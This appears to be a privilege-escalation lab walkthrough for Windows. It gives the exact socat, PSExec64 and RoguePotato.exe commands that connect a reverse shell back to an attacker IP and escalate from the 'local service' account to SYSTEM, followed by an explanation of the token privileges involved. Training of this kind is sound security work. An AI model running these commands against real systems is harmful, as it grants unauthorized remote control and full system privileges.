# üêæ 16. Token Impersonation - Rogue Potato

## üìú Task Description
In this task, we will use the `Rogue Potato` tool to gain access to the system with `SYSTEM` privileges through token impersonation. We will set up port forwarding on Kali, use `PSExec64.exe` to execute a reverse shell with the "local service" account privileges, and then run the `Rogue Potato` exploit to escalate to `SYSTEM` privileges.

---

## üîç Step 1: Set up port forwarding with socat
On Kali, set up port forwarding from port 135 to port 9999 on Windows using `socat`:

'`sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.1.124:9999`'

### üìã Expected Output
- Ensure that port forwarding is set up correctly and the listener on Kali is ready to accept connections.

---

## üîë Step 2: Simulate login with "local service" account
Start the listener on Kali. Then, simulating an administrator login, open a command prompt with administrator rights (right-click -> "Run as administrator") and use `PSExec64.exe` to launch `reverse.exe` with "local service" account privileges:

'`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`'

### üìã Expected Output
- Ensure that the reverse shell is running with "local service" account privileges and is connected to the listener on Kali.

## üìù Step 3: Run the RoguePotato exploit
Now, in the reverse shell running as "local service", run the `RoguePotato` exploit to get a second reverse shell with `SYSTEM` privileges:

'`C:\PrivEsc\RoguePotato.exe -r 10.23.0.73 -e "C:\PrivEsc\reverse.exe" -l 9999`'

### üìã Expected Output
- Ensure that the exploit is successfully executed and you receive a second reverse shell with `SYSTEM` privileges on Kali.

## üéâ Congratulations!
You have successfully used the `Rogue Potato` exploit to gain `SYSTEM` privileges through token impersonation! üéä

## üìå Notes
- Be cautious when using the knowledge gained and always act within the boundaries of authorized penetration testing.

## üìå Information about the answer
### 1. **SeImpersonatePrivilege**:
This privilege allows a user to "impersonate" another user. This is a crucial element in the token exploitation process. When a user has this privilege, they can seize or "intercept" the tokens of other users or service accounts, which is necessary for exploiting vulnerabilities like `RoguePotato`. This allows an attacker to execute commands with the privileges of another user, such as the `LOCAL SERVICE` account.

### 2. **SeAssignPrimaryTokenPrivilege**:
This privilege allows a user to assign a primary security token to other processes. When a user has this privilege, they can modify the security tokens of processes, granting the ability to escalate privileges. In the context of `RoguePotato`, this privilege is used to gain access to higher privileges, such as `SYSTEM`, by allowing the attacker to run processes under that account.

### How this works in `RoguePotato`:
- **SeImpersonatePrivilege** allows the attacker to "intercept" the `LOCAL SERVICE` token and execute commands under this account.
- **SeAssignPrimaryTokenPrivilege** allows the attacker to assign a `SYSTEM` security token to further escalate privileges and carry out attacks under that account.

It is the combination of these two privileges that enables the attacker to execute the exploit and gain `SYSTEM` privileges.
